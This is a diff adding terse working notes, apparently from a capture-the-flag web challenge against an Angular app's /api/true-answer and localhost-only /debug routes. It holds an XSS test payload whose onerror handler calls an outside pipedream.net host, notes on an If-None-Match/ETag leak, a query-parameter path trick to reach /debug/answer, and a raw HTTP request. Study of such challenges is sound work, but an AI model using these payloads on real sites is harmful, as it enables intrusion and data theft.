@@ -1,0 +1,55 @@
+answer.component.ts-> /api/answer
+-> answer.component.html (*ngIf="query === answer") => Correct, Incorrect
+
+/debug/answer -> Edit
+(TEST) <img src="invalid" onerror='new Image().src="https://b92311330cf132fa9cde87949527403b.m.pipedream.net";'>
+
+
+/debug -> allow 127.0.0.1
+
+'', /q -> search query
+q -> Question (nothing)
+s -> Answer
+** -> PageNotFound
+
+Answer component
+-> HttpClient
+->http.get(/api/answer)
+
+/api -> all 404 page (if-None-Match leak) onlY!!
+If-None-Match: W/"649-3JsFtL+w3ufUk+6VHpTUYLLt0Bw"
+
+redirection location ()
+
+/api/true-answer
+
+if-None-Match
+/api    		W/"649-3JsFtL+w3ufUk+6VHpTUYLLt0Bw"
+/api/answer                W/"4-lx5Bmb5yFOQ7Vm8ooIX8Xpp1Z9M"
+/api/true-answer       ? -> 'W/"2d-vFaN1EKboWyO9TtxBJ8wlkc8nh4"'
+
+debug
+
+
+
+
+
+/debug && env.FLAG
+	-> status(500)
+	-> debug page is disabled in production env
+
+['debug']+'/answer'
+['d#e#b#u#g']http://172.18.113.252:4200/a?q[0]=../&q[1]=/debug&q[2]=/answer
+
+
+GET /api/true-answer HTTP/1.1
+Host: 
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
+If-None-Match: W/"2d-vFaN1EKboWsO9TtxBJ8wlkc8nh4"
+Location : http://
+Connection: close
